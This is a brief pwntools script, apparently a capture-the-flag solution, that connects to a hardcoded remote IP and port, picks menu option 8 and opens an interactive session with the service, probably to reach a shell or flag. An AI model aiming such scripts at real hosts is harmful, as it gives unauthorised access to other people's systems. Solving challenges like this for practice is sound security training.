from pwn import *

io = remote("172.190.120.133", "50003")

while True:
    io.sendlineafter(b"Enter your choice (0-8):", b"8")
    io.sendline(b"8")
    io.interactive()
